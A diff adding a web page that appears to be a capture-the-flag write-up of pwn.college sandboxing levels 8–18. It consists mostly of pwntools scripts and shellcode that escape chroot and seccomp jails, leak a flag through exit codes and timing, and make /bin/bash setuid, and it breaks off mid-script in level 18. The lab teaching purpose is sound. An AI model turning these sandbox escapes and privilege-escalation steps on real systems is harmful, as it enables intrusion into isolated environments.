@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Sandboxing
+</h1>
+
+<div class="page-content">
+<h1 id="level-8">Level 8</h1>
+<p>You can open file descriptors via the command line?!?!</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>os
+</span><span>
+</span><span style="color:#65737e;"># idea from, https://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level8</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">debug</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/</span><span>&#39;], </span><span style="color:#bf616a;">stderr</span><span>=os.</span><span style="color:#bf616a;">open</span><span>(&#39;</span><span style="color:#a3be8c;">/</span><span>&#39;, os.</span><span style="color:#bf616a;">O_RDONLY</span><span>))
+</span><span>    </span><span style="color:#65737e;">#gdb.attach(r, gdbscript=&#39;b *main+1177\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>    sc = </span><span style="color:#bf616a;">asm</span><span>(&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">        // 2 = openat(2, &quot;flag&quot;, O_RDONLY, 0)
+</span><span style="color:#a3be8c;">        push 0x67616c66
+</span><span style="color:#a3be8c;">        mov rdi, 2
+</span><span style="color:#a3be8c;">        mov rsi, rsp
+</span><span style="color:#a3be8c;">        mov rdx, 0
+</span><span style="color:#a3be8c;">        mov r10, 0
+</span><span style="color:#a3be8c;">        mov rax, 257
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // buf_len = read(fd, buf, 0x100)
+</span><span style="color:#a3be8c;">        mov rdi, rax
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100]
+</span><span style="color:#a3be8c;">        mov rdx, 0x100
+</span><span style="color:#a3be8c;">        mov rax, 0
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // write(1, buf, buf_len)
+</span><span style="color:#a3be8c;">        mov rdi, 1
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100]
+</span><span style="color:#a3be8c;">        mov rdx, rax
+</span><span style="color:#a3be8c;">        mov rax, 1
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // exit(0)
+</span><span style="color:#a3be8c;">        mov rax, 60
+</span><span style="color:#a3be8c;">        mov rdi, 0
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;)
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-9">Level 9</h1>
+<p>Conveniently our shellcode get's mmap'd at a 32 bit compatible address, so we can use the 32 bit syscalls</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>os
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level9</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">debug</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>    </span><span style="color:#65737e;">#gdb.attach(r, gdbscript=&#39;b *main+787\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># 32 bit syscalls:
+</span><span>    </span><span style="color:#65737e;"># regs: ebx ecx edx esi edi
+</span><span>    </span><span style="color:#65737e;"># 3 = read
+</span><span>    </span><span style="color:#65737e;"># 4 = write
+</span><span>    </span><span style="color:#65737e;"># 5 = open
+</span><span>    </span><span style="color:#65737e;"># 6 = close
+</span><span>    sc = </span><span style="color:#bf616a;">asm</span><span>(&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">        // we reuse our shellcode mapping as buf since we need an addr that fits in 4 bytes
+</span><span style="color:#a3be8c;">        mov r8, rdx
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // fd = open(&quot;/flag&quot;, O_RDONLY, 0)
+</span><span style="color:#a3be8c;">        mov rax, 0x67616c662f
+</span><span style="color:#a3be8c;">        mov [rdx+0x100], rax
+</span><span style="color:#a3be8c;">        lea rbx, [rdx+0x100]
+</span><span style="color:#a3be8c;">        mov rcx, 0
+</span><span style="color:#a3be8c;">        mov rdx, 0
+</span><span style="color:#a3be8c;">        mov rax, 5
+</span><span style="color:#a3be8c;">        int 0x80
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // buf_len = read(fd, buf, 0x100)
+</span><span style="color:#a3be8c;">        mov rbx, rax
+</span><span style="color:#a3be8c;">        lea rcx, [r8+0x100]
+</span><span style="color:#a3be8c;">        mov rdx, 0x100
+</span><span style="color:#a3be8c;">        mov rax, 3
+</span><span style="color:#a3be8c;">        int 0x80
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // write(1, buf, buf_len)
+</span><span style="color:#a3be8c;">        mov rbx, 1
+</span><span style="color:#a3be8c;">        mov rdx, rax
+</span><span style="color:#a3be8c;">        mov rax, 4
+</span><span style="color:#a3be8c;">        int 0x80
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // exit(0)
+</span><span style="color:#a3be8c;">        mov rax, 60
+</span><span style="color:#a3be8c;">        mov rdi, 0
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;)
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-10">Level 10</h1>
+<p>Leak one byte at a time through exit</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>os
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level10</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">info</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    flag = &#39;&#39;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>&#39;</span><span style="color:#a3be8c;">}</span><span>&#39; not in flag:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/flag</span><span>&#39;])
+</span><span>        </span><span style="color:#65737e;">#gdb.attach(r, gdbscript=&#39;b *main+830\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>        sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">            // read(3, buf, 0x100)
+</span><span style="color:#a3be8c;">            mov rdi, 3
+</span><span style="color:#a3be8c;">            mov rsi, rsp
+</span><span style="color:#a3be8c;">            mov rdx, 0x100
+</span><span style="color:#a3be8c;">            mov rax, 0
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">            // exit(buf[i])
+</span><span style="color:#a3be8c;">            movb dil, [rsp+</span><span>{</span><span style="color:#96b5b4;">len</span><span>(flag)}</span><span style="color:#a3be8c;">]
+</span><span style="color:#a3be8c;">            mov rax, 60
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">        </span><span>&#39;&#39;&#39;)
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>        r.</span><span style="color:#bf616a;">recvall</span><span>()
+</span><span>        x = r.</span><span style="color:#bf616a;">poll</span><span>()
+</span><span>        flag += </span><span style="color:#96b5b4;">chr</span><span>(x)
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(flag)
+</span><span>        r.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-11">Level 11</h1>
+<p>Leak one bit at a time through timing with nanosleep</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level11</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">info</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    flag = &#39;&#39;
+</span><span>    byte = &#39;&#39;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>&#39;</span><span style="color:#a3be8c;">}</span><span>&#39; not in flag:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/flag</span><span>&#39;])
+</span><span>        </span><span style="color:#65737e;">#gdb.attach(r, gdbscript=&#39;b *main+830\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>        sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">            // read(3, buf, 0x100)
+</span><span style="color:#a3be8c;">            mov rdi, 3
+</span><span style="color:#a3be8c;">            mov rsi, rsp
+</span><span style="color:#a3be8c;">            mov rdx, 0x100
+</span><span style="color:#a3be8c;">            mov rax, 0
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">            // if (buf[flag_len] &gt;&gt; nbits &amp; 1 == 0)
+</span><span style="color:#a3be8c;">            //    nanosleep(100000000)
+</span><span style="color:#a3be8c;">            movb dil, [rsp+</span><span>{</span><span style="color:#96b5b4;">len</span><span>(flag)}</span><span style="color:#a3be8c;">]
+</span><span style="color:#a3be8c;">            shr dil, </span><span>{</span><span style="color:#96b5b4;">len</span><span>(byte)}
+</span><span style="color:#a3be8c;">            and dil, 0x1
+</span><span style="color:#a3be8c;">            cmp dil, 0
+</span><span style="color:#a3be8c;">            je fail
+</span><span style="color:#a3be8c;">            movq [rbp-0x20], 0
+</span><span style="color:#a3be8c;">            movq [rbp-0x18], 0x10000000
+</span><span style="color:#a3be8c;">            lea rdi, [rbp-0x20]
+</span><span style="color:#a3be8c;">            mov rsi, 0
+</span><span style="color:#a3be8c;">            mov rax, 35
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        fail:
+</span><span style="color:#a3be8c;">            nop
+</span><span style="color:#a3be8c;">        </span><span>&#39;&#39;&#39;)
+</span><span>        r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>        x = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>        r.</span><span style="color:#bf616a;">poll</span><span>(</span><span style="color:#bf616a;">block</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span>        x = time.</span><span style="color:#bf616a;">time</span><span>() - x
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(x)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(x &lt; </span><span style="color:#d08770;">0.30</span><span>):
+</span><span>            byte = &#39;</span><span style="color:#a3be8c;">0</span><span>&#39; + byte
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            byte = &#39;</span><span style="color:#a3be8c;">1</span><span>&#39; + byte
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">byte =</span><span>&#39;, byte)
+</span><span>        </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span>(byte) == </span><span style="color:#d08770;">8</span><span>:
+</span><span>            flag += </span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#bf616a;">int</span><span>(byte, </span><span style="color:#d08770;">2</span><span>))
+</span><span>            byte = &#39;&#39;
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(flag)
+</span><span>        r.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-12">Level 12</h1>
+<p>Leak one bit at a time through exit code, -SIGSEGV or -SIGSYS</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level12</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">info</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    flag = &#39;&#39;
+</span><span>    byte = &#39;&#39;
+</span><span>    </span><span style="color:#b48ead;">while </span><span>&#39;</span><span style="color:#a3be8c;">}</span><span>&#39; not in flag:
+</span><span>        r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/flag</span><span>&#39;])
+</span><span>        </span><span style="color:#65737e;">#gdb.attach(r, gdbscript=&#39;b *main+830\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>        sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">            // read(3, buf, 0x100)
+</span><span style="color:#a3be8c;">            mov rdi, 3
+</span><span style="color:#a3be8c;">            mov rsi, rsp
+</span><span style="color:#a3be8c;">            mov rdx, 0x100
+</span><span style="color:#a3be8c;">            mov rax, 0
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">            // if (buf[flag_len] &gt;&gt; nbits &amp; 1 == 0)
+</span><span style="color:#a3be8c;">            //    nanosleep(100000000)
+</span><span style="color:#a3be8c;">            movb dil, [rsp+</span><span>{</span><span style="color:#96b5b4;">len</span><span>(flag)}</span><span style="color:#a3be8c;">]
+</span><span style="color:#a3be8c;">            shr dil, </span><span>{</span><span style="color:#96b5b4;">len</span><span>(byte)}
+</span><span style="color:#a3be8c;">            and dil, 0x1
+</span><span style="color:#a3be8c;">            cmp dil, 0
+</span><span style="color:#a3be8c;">            je fail
+</span><span style="color:#a3be8c;">            mov rsi, 0
+</span><span style="color:#a3be8c;">            mov rax, 60
+</span><span style="color:#a3be8c;">            syscall
+</span><span style="color:#a3be8c;">        fail:
+</span><span style="color:#a3be8c;">            nop
+</span><span style="color:#a3be8c;">        </span><span>&#39;&#39;&#39;)
+</span><span>        r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>        x = time.</span><span style="color:#bf616a;">time</span><span>()
+</span><span>        r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>        x = r.</span><span style="color:#bf616a;">poll</span><span>(</span><span style="color:#bf616a;">block</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(x)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(x == -</span><span style="color:#d08770;">11</span><span>):
+</span><span>            byte = &#39;</span><span style="color:#a3be8c;">0</span><span>&#39; + byte
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            byte = &#39;</span><span style="color:#a3be8c;">1</span><span>&#39; + byte
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">byte =</span><span>&#39;, byte)
+</span><span>        </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span>(byte) == </span><span style="color:#d08770;">8</span><span>:
+</span><span>            flag += </span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#bf616a;">int</span><span>(byte, </span><span style="color:#d08770;">2</span><span>))
+</span><span>            byte = &#39;&#39;
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(flag)
+</span><span>        r.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-13">Level 13</h1>
+<p>Just communicate with parent process correctly</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level13</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">info</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path])
+</span><span>    </span><span style="color:#65737e;">#r = gdb.debug([exe.path], gdbscript=&#39;b *main+474\nb *main+1144\nset follow-fork-mode child\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>    sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">        // write(4, &quot;read_file flag&quot;, 14)
+</span><span style="color:#a3be8c;">        mov rax, 0x6c69665f64616572
+</span><span style="color:#a3be8c;">        mov [rbp-0x17], rax
+</span><span style="color:#a3be8c;">        movq [rbp-0xf], 0x6c662065
+</span><span style="color:#a3be8c;">        movw [rbp-0xb], 0x6761
+</span><span style="color:#a3be8c;">        movb [rbp-0x9], 0x0
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x17]
+</span><span style="color:#a3be8c;">        mov rdi, 4
+</span><span style="color:#a3be8c;">        mov rdx, 14
+</span><span style="color:#a3be8c;">        mov rax, 1
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // nbytes = read(4, buf, 0x100)
+</span><span style="color:#a3be8c;">        mov rdi, 4
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100]
+</span><span style="color:#a3be8c;">        mov rdx, 0x100
+</span><span style="color:#a3be8c;">        mov rax, 0
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // write(4, &quot;print_msg &quot; + buf, nbytes)
+</span><span style="color:#a3be8c;">        movw [rbp-0x100-2], 0x2067
+</span><span style="color:#a3be8c;">        mov rax, 0x736d5f746e697270
+</span><span style="color:#a3be8c;">        movq [rbp-0x100-2-8], rax
+</span><span style="color:#a3be8c;">        mov rdi, 4
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100-2-8]
+</span><span style="color:#a3be8c;">        mov rdx, 0x100
+</span><span style="color:#a3be8c;">        mov rax, 1
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;)
+</span><span>    r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-14">Level 14</h1>
+<p>Host filesystem not unmounted, accessible through &quot;/old&quot;.</p>
+<p>From in the sandbox:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cat /old/flag
+</span></code></pre>
+<h1 id="level-15">Level 15</h1>
+<p>Changes from the sandbox persist to the host filesystem.</p>
+<p>From in the sandbox:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>chmod +s /bin/bash
+</span></code></pre>
+<p>From outside the sandbox:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>/bin/bash -pc &#39;cat /flag&#39;
+</span></code></pre>
+<h1 id="level-16">Level 16</h1>
+<p>Host filesystem accessible through &quot;/proc&quot;</p>
+<p>From in the sandbox:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>cat /proc/1/root/flag
+</span></code></pre>
+<h1 id="level-17">Level 17</h1>
+<p>Sandbox takes an argument to open, so we can open &quot;/&quot; before being sandboxed, then do openat stuff</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level17</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">debug</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/</span><span>&#39;])
+</span><span>    </span><span style="color:#65737e;">#r = gdb.debug([exe.path], gdbscript=&#39;b *main+474\nb *main+1144\nset follow-fork-mode child\ndisplay/12i $rip\ndisplay $rax&#39;)
+</span><span>    sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">        // openat(3, &quot;flag&quot;, 0, 0)
+</span><span style="color:#a3be8c;">        push 0x67616c66
+</span><span style="color:#a3be8c;">        mov rdi, 3
+</span><span style="color:#a3be8c;">        mov rsi, rsp
+</span><span style="color:#a3be8c;">        mov rdx, 0
+</span><span style="color:#a3be8c;">        mov r10, 0
+</span><span style="color:#a3be8c;">        mov rax, 257
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // nbytes = read(4, buf, 0x100)
+</span><span style="color:#a3be8c;">        mov rdi, 4
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100]
+</span><span style="color:#a3be8c;">        mov rdx, 0x100
+</span><span style="color:#a3be8c;">        mov rax, 0
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        // write(1, buf, nbytes)
+</span><span style="color:#a3be8c;">        mov rdi, 1
+</span><span style="color:#a3be8c;">        lea rsi, [rbp-0x100]
+</span><span style="color:#a3be8c;">        mov rdx, rax
+</span><span style="color:#a3be8c;">        mov rax, 1
+</span><span style="color:#a3be8c;">        syscall
+</span><span style="color:#a3be8c;">
+</span><span style="color:#a3be8c;">        mov rdi, 0
+</span><span style="color:#a3be8c;">        mov rax, 60
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;)
+</span><span>    r.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>    r.</span><span style="color:#bf616a;">sendline</span><span>(sc)
+</span><span>    r.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#bf616a;">main</span><span>()
+</span></code></pre>
+<h1 id="level-18">Level 18</h1>
+<p>The sandbox can mount &quot;/proc/1/ns&quot; and then use the setns syscall to escape</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">main</span><span>():
+</span><span>    exe = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">/challenge/babyjail_level18</span><span>&#39;)
+</span><span>    context.binary = exe
+</span><span>    context.log_level=&#39;</span><span style="color:#a3be8c;">debug</span><span>&#39;
+</span><span>    context.terminal=[&#39;</span><span style="color:#a3be8c;">tmux</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">splitw</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">-v</span><span>&#39;]
+</span><span>
+</span><span>    r = </span><span style="color:#bf616a;">process</span><span>([exe.path, &#39;</span><span style="color:#a3be8c;">/proc/1/ns</span><span>&#39;])
+</span><span>    </span><span style="color:#65737e;">#r = gdb.debug([exe.path, &#39;/proc/1/ns&#39;], gdbscript=&#39;b *main+3082\ndisplay/6i $rip\ndisplay $rax&#39;)
+</span><span>    sc = </span><span style="color:#bf616a;">asm</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">        // fd = open(&quot;/data/mnt&quot;, O_RDONLY, 0)
+</span><span style="color:#a3be8c;">        mov rax,0x6e6d2f617461642f
+</span><span style="color:#a3be8c;">        mov [rbp-0xe], rax
+</span><span style="color:#a3be8c;">        movw [rbp-0x6], 0x74
+</span><span style="color:#a3be8c;">        mov rdx, 0
+</span><span style="color:#a3be8c;">        mov rsi, 0
+</span><span style="color:#a3be8c;">        lea rdi, [rbp-0xe]
